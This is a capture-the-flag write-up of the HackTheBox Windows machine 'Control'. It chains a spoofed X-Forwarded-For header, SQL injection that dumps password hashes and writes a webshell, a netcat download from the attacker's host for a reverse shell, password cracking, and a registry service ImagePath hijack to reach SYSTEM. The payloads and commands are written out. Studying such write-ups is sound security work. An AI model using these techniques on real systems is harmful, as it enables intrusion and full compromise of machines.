---
layout: post
title: "Who Gets to Say Yes"
subtitle: "HTB Control, where a forged header walks past the bouncer, a database writes your shell to disk, and a user who can edit the rules edits himself into SYSTEM"
date: 2020-05-02 12:00:00 +0000
description: "A spoofed proxy header opens the admin panel, a FILE-privileged database writes a webshell to the web root, and a user with write access to the Services registry key turns himself into SYSTEM."
image: /assets/og/who-gets-to-say-yes.png
tags: [hackthebox, writeup]
---

Control is a box about permission, and about every place a system gets confused over who is allowed to grant it. The admin panel will not talk to you until a header claims you arrived through the right gateway, so you write that header yourself. The product search lets a database account with one extra privilege spill its own password table and then write a file straight to the web root. And the privilege escalation is the cleanest version of the whole theme: a user who is allowed to edit the rulebook that decides which programs run as the machine itself. Nobody overpowers anything here. At every turn, the box asks "who said you could do that," and you simply produce a yes that nobody checked hard enough.

```
        C O N T R O L
        =============
        /admin.php   "you came in the wrong door"
        X-Forwarded-For: 192.168.4.28
                     "...oh, you're internal. come in."
                     |
                     v
        the database has the FILE key.
        it dumps its own passwords, then writes
        your shell onto the web server's disk.
                     |
                     v
        a user who can edit the list of services
        edits one to run as the whole machine.
                                            權
```

## 0x01 · the wrong door

`nmap` paints a short, very Windows picture. A web server, the RPC endpoint, and a database that should never be answering the internet.

```
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
135/tcp  open  msrpc    Microsoft Windows RPC
3306/tcp open  mysql    MariaDB
```

The site is an inventory storefront, and the interesting link is a login to `/admin.php` that slams the door the moment you knock. Before guessing credentials, read the page source, because Control leaves a sticky note in the HTML. A developer to-do list mentions a certificates path on `\\192.168.4.28\myfiles`. That address is the tell. The admin panel is not checking who you are. It is checking where you came from, and it trusts an internal address it never should have trusted.

## 0x02 · a header you write yourself

Web apps love to ask a proxy "where did this request really come from," and the proxy answers in a header like `X-Forwarded-For`. The problem is that the header is just text in your request, and you control your own request. The bouncer is asking the guest to fill out the form that decides whether the guest gets in. Picture a club that lets you skip the line if you can prove you live in the building, and the proof it accepts is you writing your own address on a slip of paper. So you write the address from the sticky note.

You can fuzz which header the app actually reads, since there are several it might trust, by throwing the candidate names at the endpoint and watching for a response that changes size.

```
$ wfuzz -c -w headers.txt -u http://10.10.10.167/admin.php \
    -H "FUZZ: 192.168.4.28" --hh 89
000000037:   200   ...   "X-Forwarded-For"
```

Send `X-Forwarded-For: 192.168.4.28` and `/admin.php` stops being a wall and becomes an inventory dashboard. The box decided you were internal because you said you were.

## 0x03 · the database with the spare key

The dashboard has a product search, and a search box that talks to a database is an invitation. Send a single quote in the `productName` field and MariaDB coughs up a syntax error, which is the database telling on itself. From there it is union-based SQL injection. A quick column count lands on six.

```
productName=Asus' UNION SELECT 1,2,3,4,5,6-- -
```

Think of SQL injection like slipping an extra sentence into a form letter the clerk reads aloud without checking. The clerk was supposed to read your product name. Instead, the part after your quote becomes a brand-new instruction the database happily carries out. The current account turns out to be `manager`, and `manager` holds the FILE privilege, which is the spare key to the building. With FILE, the database can read and write actual files on the server's disk. First, point it at its own password table.

```
productName=Asus' UNION SELECT host,user,password,4,5,6 FROM mysql.user-- -
```

Out fall the password hashes for `root`, `manager`, and `hector`. Hold those. The FILE key does something louder, too. `INTO OUTFILE` lets a query result get written to a path you name, and IIS serves files out of a known directory, so you write a webshell straight into the web root.

```
productName=Asus' UNION SELECT
  '<?php [ one-line webshell: run the cmd request parameter ] ?>',
  2,3,4,5,6 INTO OUTFILE 'c:/inetpub/wwwroot/iceberg.php'-- -
```

I am describing that file rather than printing it, and that is the whole point. The real string is four words long and any antivirus alive quarantines it on sight, which is the funniest possible proof of how dangerous a one-line webshell is. Browse to your dropped file with a command in the query string and the server runs it as `nt authority\iusr`, the low-privilege identity IIS wears.

```
$ curl 'http://10.10.10.167/iceberg.php?cmd=whoami'
nt authority\iusr
```

Trade up from the webshell to a proper reverse shell. Stage a copy of netcat to a writable temp path and call home.

```
PS> wget http://10.10.14.4/nc64.exe -outfile \windows\temp\nc.exe
PS> [ nc reverse shell: \windows\temp\nc.exe back to 10.10.14.4 on 443 ]
```

## 0x04 · the password that fit a real account

`iusr` is a nobody. But you walked out of the database with hashes, and one of them belongs to a real person on this box. Feed `hector`'s hash to `hashcat` with the right MySQL mode and a wordlist, and it falls fast.

```
$ hashcat -m 300 hashes.txt rockyou.txt
0e178792e8fc304a2e3133d535d38caf1da3cd9d:l33th4x0rhector
```

`hector:l33th4x0rhector`. A database password reused as a Windows password, the oldest hinge in the building. The reason it matters here is membership. `hector` sits in the Remote Management Users group, which means WinRM will take his credentials, so you can come back through the front door as a real user instead of crawling sideways from a webshell.

```
$ evil-winrm -i 10.10.10.167 -u hector -p l33th4x0rhector
*Evil-WinRM* PS C:\Users\Hector> type Desktop\user.txt
████████████████████████████████
```

## 0x05 · the writable rulebook

Hector is not an administrator, so the question becomes what he is allowed to touch that he should not be. Windows keeps the master list of services in the registry, under `HKLM:\SYSTEM\CurrentControlSet\Services`, and each service entry includes an `ImagePath`, the program Windows runs when that service starts. Many services start as `LocalSystem`, the most powerful account on the box. So if you can edit a service's `ImagePath`, you choose the program that the machine runs as itself.

Check who owns that rulebook. PowerShell can read the access list and translate it from its raw form into something legible.

```
PS> $acl = Get-Acl HKLM:\SYSTEM\CurrentControlSet\Services
PS> ConvertFrom-SddlString -Sddl $acl.Sddl | % { $_.DiscretionaryAcl }
...
CONTROL\Hector: AccessAllowed (FullControl)
```

There it is. Hector has `FullControl` over the list that decides what the machine runs as `SYSTEM`. Think of it like a night watchman who is allowed to rewrite the instructions taped to every door, including the door that says "open the vault at 3am." He cannot open the vault. He can rewrite the instruction so the building opens it for him.

You want a service that an ordinary user is permitted to start and that runs as `LocalSystem`. Walk the services, match the ones whose security descriptor lets authenticated users start them, and for one of those, swap its `ImagePath` to your netcat, start it, then put the original path back so nothing stays obviously broken.

```
PS> $svc = "seclogon"
PS> $old = (Get-ItemProperty HKLM:\system\currentcontrolset\services\$svc).ImagePath
PS> Set-ItemProperty HKLM:\system\currentcontrolset\services\$svc `
      -Name ImagePath `
      -Value "[ nc reverse shell binary calling 10.10.14.4 on 443 ]"
PS> Start-Service $svc
PS> Set-ItemProperty HKLM:\system\currentcontrolset\services\$svc -Name ImagePath -Value $old
```

`seclogon` starts, Windows reads the instruction you rewrote, and runs your binary as itself. The shell comes back wearing the machine's own coat.

```
$ nc -lvnp 443
connect to [10.10.14.4] from 10.10.10.167
C:\> whoami
nt authority\system
C:\> type C:\Users\Administrator\Desktop\root.txt
████████████████████████████████
```

A small note on the costume. People reach for SeImpersonate and a potato on Windows when a service account holds that one impersonation right, and it is a fair instinct on this box because `iusr` lives in that family. But Control hands you a cleaner door than a token trick. You do not need to impersonate `SYSTEM` when you are allowed to edit the list that decides what `SYSTEM` runs. The registry write is the privilege, and it was sitting in an access control entry the whole time.

## 0x06 · the honest caveat

Every step of Control is the same failure wearing a different uniform: trust placed in something the attacker controls. The admin gate trusted a header you typed. The search box trusted that your input was a product name and not a command. The pivot trusted that a database password and a login password would stay different, and they were the same. And the finale trusted an access control entry that quietly handed a non-admin write access to the registry keys that define `SYSTEM` services.

That last one is the one worth losing sleep over, because nothing on the box was unpatched. There is no CVE here, no exploit binary, no missing update. A permission was set too wide, on a key powerful enough that "too wide" means "game over." You cannot patch your way out of a bad ACL. An access control list is a sentence the system reads literally, and the only question it ever answers is who gets to say yes. Control fails because too many things were allowed to answer that question on their own behalf. The header spoke for the proxy. The database spoke for the filesystem. And one ordinary user was quietly allowed to speak for the entire machine.

## 0x07 · outro

```
the door asked where you came from. you told it.
the database had a key to the floor, and used it on itself.
a user who could edit the rules edited one line,
        and the machine ran it as its own heart.

no exploit. no overflow. just permission,
handed to the wrong hands and never asked to prove it.

check who answers the question. mind the ACL. wear black.

                                                            EOF
```

---

*HTB: Control, retired 25 Apr 2020. A hard Windows box that is really a lecture on trust boundaries, from a forged header to a writable registry key. The bouncer never checked who wrote the address on the slip.*